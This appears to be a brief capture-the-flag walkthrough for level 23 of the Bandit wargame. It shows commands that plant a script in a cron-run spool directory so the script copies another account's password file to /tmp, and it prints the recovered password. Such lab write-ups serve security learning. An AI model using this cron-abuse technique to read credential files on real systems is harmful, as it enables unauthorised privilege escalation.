# Commands for level 23
```cd /etc/cron.d```
```cat cronjob_bandit24```
```cat /usr/bin/cronjob_bandit24.sh```
```cd /var/spool/bandit24/foo```
```vim get.sh```
create a new script and add a simple line to it top copy the password in a file we can access in this case, let's put it in /tmp/rockyou
```#!/bin/bash```
```cat /etc/bandit_pass/bandit24 > /tmp/rockyou```
in the next minute, check the contents of /tmp/rockyou
```cat /tmp/rockyou```
## Key
__VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar__
